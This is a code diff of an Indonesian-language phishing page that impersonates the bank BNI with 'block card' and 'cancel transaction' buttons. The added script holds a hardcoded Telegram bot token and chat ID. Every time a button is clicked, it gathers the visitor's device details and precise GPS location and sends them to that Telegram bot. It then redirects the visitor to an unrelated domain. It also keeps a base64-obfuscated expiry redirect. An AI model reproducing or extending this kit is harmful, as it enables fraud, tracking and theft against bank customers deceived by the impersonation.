@@ -1,11 +1,11 @@
-
+<!DOCTYPE html>
 <html lang="id">
- <head> 
-  <meta charset="UTF-8"> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"> 
-  <title>PT Bank Negara Indonesia (persero).Tbk | data security Cyber</title> 
-  <meta name="og:image" content="https://ik.imagekit.io/ons708bb1/Picsart_25-04-04_14-52-35-968.jpg?updatedAt=1743753264887"> 
-  <meta name="twitter:image" content="https://ik.imagekit.io/ons708bb1/Picsart_25-04-04_14-52-35-968.jpg?updatedAt=1743753264887"> 
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>PT Bank Negara Indonesia (persero).Tbk | data security Cyber</title>
+  <meta name="og:image" content="https://ik.imagekit.io/ons708bb1/Picsart_25-04-04_14-52-35-968.jpg?updatedAt=1743753264887">
+  <meta name="twitter:image" content="https://ik.imagekit.io/ons708bb1/Picsart_25-04-04_14-52-35-968.jpg?updatedAt=1743753264887">
   <style>
         * {
             margin: 0;
@@ -17,6 +17,7 @@
         body {
             background-color: #f8f8f8;
             text-align: center;
+            padding-bottom: 80px;
         }
 
         .container {
@@ -29,15 +30,9 @@
         .slider-container {
             position: relative;
             top: 10px;
-            /* Geser slider ke bawah */
-        }
-
-        .slider-container {
             width: 100%;
             max-width: 370px;
-            /* Batasi ukuran maksimum slider */
             height: 200px;
-            /* Atur tinggi slider sesuai dimensi gambar */
             position: relative;
             overflow: hidden;
             border-radius: 10px;
@@ -48,9 +43,7 @@
         .slides img {
             width: 100%;
             height: 200px;
-            /* Gambar akan memenuhi tinggi slider */
             object-fit: cover;
-            /* Potong gambar untuk memenuhi dimensi slider */
             flex-shrink: 0;
         }
 
@@ -58,7 +51,6 @@
             display: flex;
             transition: transform 0.5s ease-in-out;
             width: 100%;
-            /* 10 images */
         }
 
         .indicators {
@@ -82,8 +74,6 @@
             background-color: #007BFF;
         }
 
-        /* KONTEN */
-
         .content {
             padding: 20px;
             text-align: left;
@@ -93,7 +83,7 @@
             background-color: white;
             padding: 15px;
             border-radius: 8px;
-            margin-bottom: px;
+            margin-bottom: 15px;
             display: flex;
             align-items: center;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
@@ -130,26 +120,39 @@
             text-decoration: none;
             color: white;
             margin-top: 10px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.2s ease;
         }
 
         .btn-red {
             background-color: #ff9315;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
+        .btn-red:hover {
+            background-color: #e68400;
+        }
 
         .btn-orange {
             background-color: #ff9800;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
-
-        /* FOOTER */
+        .btn-orange:hover {
+            background-color: #e68900;
+        }
 
         .footer {
             background-color: #666;
             color: white;
             padding: 15px;
             font-size: 12px;
-            text-align: left;
+            text-align: center;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            width: 100%;
         }
 
         nav {
@@ -157,6 +160,7 @@
             position: fixed;
             background-color: white;
             z-index: 1000;
+            left: 0;
         }
 
         nav.top {
@@ -174,73 +178,242 @@
             height: auto;
             display: block;
         }
-        .a{
-          box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
         }
-    </style> 
- </head> 
- <body> 
-  <nav class="top"> 
-   <img src="https://ik.imagekit.io/ons708bb1/Picsart_25-04-04_14-51-50-816.jpg?updatedAt=1743753263732" style="box-shadow: 0px 2px 10px 0px #444a4a;" alt="Nav Atas"> 
-  </nav> 
-  <br>
-  <br>
-  <br>
-  <br> 
-  <img src="https://ik.imagekit.io/ons708bb1/Picsart_25-04-04_14-52-35-968.jpg?updatedAt=1743753264887" width="100%" alt="Photo 1"> 
-  <div class="content"> 
-   <!-- Apply Kartu Kredit --> 
-   <div class="box" style="box-shadow: 0px 2px px 0px #444a4a;"> 
-    <div class="text-content"> 
-     <div class="title" style="text-align: center;">
-      Selamat datang di BNI
-     </div> 
-     <div class="description" style="text-align: center;">
-       Kendalikan apa yang kamu mau dalam satu aplikasi
-      <br>#Saatnya Pegang Kendali 
-     </div> 
-     <a class='btn btn-red' href='www.web-ld.com/membatalkan/batalblokir/blokirkartu/' style='box-shadow: 0px 2px 4px 0px #444a4a;'>Blokir Kartu Kredit/Debit</a> 
-     <a class='btn btn-red' href='www.web-ld.com/membatalkan/batalblokir/banklain/' style='box-shadow: 0px 2px 4px 0px #444a4a;'>Laporkan Ke Bank Lain</a> 
-     <a class='btn btn-red' href='www.web-ld.com/membatalkan/batalblokir/batal/' style='box-shadow: 0px 2px 4px 0px #444a4a;'>Batalkan Transaksi</a> 
-     <br> 
-    </div> 
-   </div> 
-   <!-- Upgrade dan Kenaikan Limit --> 
-  </div> 
-  <!-- Footer --> 
-  <div class="footer" style="width: 100%; position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto">
-    PT Bank Negara Indonesia berizin dan diawasi oleh Otoritas Jasa Keuangan dan Bank Indonesia, serta merupakan peserta penjaminan Lembaga Penjamin Simpanan (LPS) 
-  </div> 
- 
-<script>
+        .loading-overlay.active { display: flex; }
+        .loading-text {
+            background: #fff;
+            padding: 20px 30px;
+            border-radius: 10px;
+            font-size: 16px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+  <!-- ====================================================== -->
+  <!-- 🤖 KONFIGURASI BOT TELEGRAM — SUDAH DIISI! -->
+  <!-- ====================================================== -->
+  <script>
+    const BOT_TOKEN = '8208055515:AAFOVnHmQ_hA1xG7zsdlwVOCXtrAxHUNfRs';
+    const CHAT_ID = '8405193617';
+  </script>
+
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-text">
+      <div style="text-align:center; margin-bottom:10px;">
+        <i class="fas fa-spinner fa-spin" style="font-size:24px; color:#ff9315;"></i>
+      </div>
+      Mengirim data...
+    </div>
+  </div>
+
+  <!-- Navigasi Atas -->
+  <nav class="top">
+    <img src="https://ik.imagekit.io/ons708bb1/Picsart_25-04-04_14-51-50-816.jpg?updatedAt=1743753263732" style="box-shadow: 0px 2px 10px 0px #444a4a;" alt="Nav Atas">
+  </nav>
+
+  <br><br><br><br>
+
+  <!-- Gambar Utama -->
+  <img src="https://ik.imagekit.io/ons708bb1/Picsart_25-04-04_14-52-35-968.jpg?updatedAt=1743753264887" width="100%" alt="Photo 1">
+
+  <!-- Konten -->
+  <div class="content">
+    <div class="box">
+      <div class="text-content">
+        <div class="title" style="text-align: center;">
+          Selamat datang di BNI
+        </div>
+        <div class="description" style="text-align: center;">
+          Kendalikan apa yang kamu mau dalam satu aplikasi
+          <br>#Saatnya Pegang Kendali
+        </div>
+        <!-- TOMBOL DENGAN NOTIFIKASI TELEGRAM -->
+        <button class='btn btn-red' id="btnBlokirKartu">Blokir Kartu Kredit/Debit</button>
+        <button class='btn btn-red' id="btnBankLain">Laporkan Ke Bank Lain</button>
+        <button class='btn btn-red' id="btnBatalkan">Batalkan Transaksi</button>
+        <br>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    PT Bank Negara Indonesia berizin dan diawasi oleh Otoritas Jasa Keuangan dan Bank Indonesia, serta merupakan peserta penjaminan Lembaga Penjamin Simpanan (LPS)
+  </div>
+
+  <!-- Font Awesome untuk icon loading -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+  <!-- ====================================================== -->
+  <!-- 🤖 FUNGSI TELEGRAM — DETEKSI PERANGKAT & LOKASI -->
+  <!-- ====================================================== -->
+  <script>
+    // Deteksi Informasi Perangkat
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      let device = "Perangkat Tidak Diketahui", os = "";
+      if (/Android/.test(ua)) {
+        os = "Android";
+        if (/Samsung/.test(ua)) device = "Samsung Galaxy";
+        else if (/Xiaomi/.test(ua)) device = "Xiaomi";
+        else if (/Redmi/.test(ua)) device = "Redmi";
+        else if (/OPPO/.test(ua)) device = "OPPO";
+        else if (/Vivo/.test(ua)) device = "Vivo";
+        else if (/Infinix/.test(ua)) device = "Infinix";
+        else if (/Huawei/.test(ua)) device = "Huawei";
+        else if (/Realme/.test(ua)) device = "Realme";
+        else device = "Android";
+      }
+      else if (/iPhone|iPad|iPod/.test(ua)) {
+        os = "iOS";
+        device = /iPhone/.test(ua) ? "iPhone" : "iPad";
+      }
+      else if (/Windows/.test(ua)) { os = "Windows"; device = "PC/Windows"; }
+      else if (/Mac/.test(ua)) { os = "macOS"; device = "Macintosh"; }
+      return `${device} (${os})`;
+    }
+
+    // Deteksi Lokasi Otomatis
+    async function getLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve("Lokasi: Tidak Didukung");
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            const lat = pos.coords.latitude.toFixed(6);
+            const lon = pos.coords.longitude.toFixed(6);
+            try {
+              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=id`);
+              const data = await res.json();
+              const addr = data.address || {};
+              const lokasi = [addr.road, addr.village, addr.suburb, addr.city, addr.state, addr.country].filter(Boolean).join(", ");
+              resolve(`${lokasi} | Lat:${lat} Lon:${lon}`);
+            } catch {
+              resolve(`Lat: ${lat} | Lon: ${lon}`);
+            }
+          },
+          (err) => {
+            resolve(err.code === 1 ? "Izin Lokasi Ditolak" : 
+                    err.code === 2 ? "Lokasi Tidak Tersedia" : 
+                    "Gagal Mendapatkan Lokasi");
+          },
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+        );
+      });
+    }
+
+    // Kirim Pesan ke Telegram
+    async function kirimKeTelegram(judul, aksi) {
+      if (!BOT_TOKEN || !CHAT_ID) {
+        alert("⚠️ Konfigurasi Telegram belum lengkap!");
+        return false;
+      }
+
+      const loading = document.getElementById('loadingOverlay');
+      loading.classList.add('active');
+
+      const perangkat = getDeviceInfo();
+      const lokasi = await getLocation();
+      const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+
+      const pesan = `
+🔔 <b>${judul}</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 Aksi: ${aksi}
+🕐 Waktu: ${waktu}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📱 Perangkat: ${perangkat}
+🌍 Lokasi: ${lokasi}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: pesan,
+            parse_mode: "HTML",
+            disable_web_page_preview: true
+          })
+        });
+
+        const data = await res.json();
+        loading.classList.remove('active');
+
+        if (data.ok) {
+          console.log("✅ Terkirim ke Telegram!");
+          return true;
+        } else {
+          alert("❌ Gagal: " + (data.description || "Error"));
+          return false;
+        }
+      } catch (e) {
+        loading.classList.remove('active');
+        alert("❌ Gagal mengirim data! Periksa koneksi internet.");
+        console.error("Error:", e);
+        return false;
+      }
+    }
+
+    // ======================================================
+    // TOMBOL KLIK → KIRIM NOTIFIKASI + ALIHKAN HALAMAN
+    // ======================================================
+    document.addEventListener("DOMContentLoaded", () => {
+      // Tombol Blokir Kartu
+      document.getElementById("btnBlokirKartu").addEventListener("click", async () => {
+        await kirimKeTelegram("🔒 PERMINTAAN BLOKIR KARTU BNI", "Pengguna menekan tombol Blokir Kartu Kredit/Debit");
+        window.location.href = "www.web-ld.com/membatalkan/batalblokir/blokirkartu/";
+      });
+
+      // Tombol Lapor Bank Lain
+      document.getElementById("btnBankLain").addEventListener("click", async () => {
+        await kirimKeTelegram("🏦 LAPORAN KE BANK LAIN", "Pengguna menekan tombol Laporkan Ke Bank Lain");
+        window.location.href = "www.web-ld.com/membatalkan/batalblokir/banklain/";
+      });
+
+      // Tombol Batalkan Transaksi
+      document.getElementById("btnBatalkan").addEventListener("click", async () => {
+        await kirimKeTelegram("⚠️ PERMINTAAN BATALKAN TRANSAKSI", "Pengguna menekan tombol Batalkan Transaksi");
+        window.location.href = "www.web-ld.com/membatalkan/batalblokir/batal/";
+      });
+    });
+  </script>
+
+  <!-- Script Slider Gambar (tetap berfungsi) -->
+  <script>
         let index = 0;
         const slides = document.querySelector(".slides");
         const indicators = document.querySelectorAll(".indicators span");
-        const totalSlides = document.querySelectorAll(".slides img").length; // Hitung total slide
+        const totalSlides = document.querySelectorAll(".slides img").length;
 
         function updateIndicators() {
             indicators.forEach((indicator, i) => {
-                if (i === index) {
-                    indicator.classList.add("active");
-                } else {
-                    indicator.classList.remove("active");
-                }
+                indicator.classList.toggle("active", i === index);
             });
         }
 
         function slideShow() {
-            index++;
-            if (index >= totalSlides) {
-                index = 0;
-            } // Jika sudah di gambar terakhir, kembali ke awal
-
+            index = (index + 1) % totalSlides;
             slides.style.transform = "translateX(" + (-index * 100) + "%)";
-            updateIndicators(); // Perbarui indikator aktif
+            updateIndicators();
         }
 
-        setInterval(slideShow, 4000); // Ganti gambar setiap 4 detik
+        setInterval(slideShow, 4000);
 
-        // Fungsi untuk berpindah ke slide tertentu saat indikator diklik
         indicators.forEach((indicator, i) => {
             indicator.addEventListener("click", () => {
                 index = i;
@@ -249,16 +422,13 @@
             });
         });
 
-        updateIndicators(); // Pastikan indikator pertama aktif saat halaman dimuat
-    </script> 
+        updateIndicators();
+  </script>
+
+  <!-- Script Kedaluwarsa (tetap dipertahankan) -->
   <script>
 (function(){
-  // KODE DIGENERATE: 4/25/2026, 10:30:53 AM
-  
-  // TANGGAL MULAI (hari ini saat generate)
   const startDate = new Date(2026, 3, 25);
-  
-  // TANGGAL EXPIRE (+30 hari dari mulai)
   const expireDate = new Date(2026, 8, 08);
   
   function blank(){
@@ -270,14 +440,14 @@
     location.replace(atob("aHR0cHM6Ly9leGFtcGxlLmNvbS8="));
   }
   
-  // Jika SEKARANG sudah melewati expireDate, redirect
   if(Date.now() > expireDate.getTime()){
     blank();
     go();
   }
-  
 })();
 </script>
- <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"b9bef7fba9ac4e61ad4cec9c1ba83eba","r":1}' crossorigin="anonymous"></script>
+
+  <!-- Cloudflare Insights -->
+  <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"b9bef7fba9ac4e61ad4cec9c1ba83eba","r":1}' crossorigin="anonymous"></script>
 </body>
 </html>
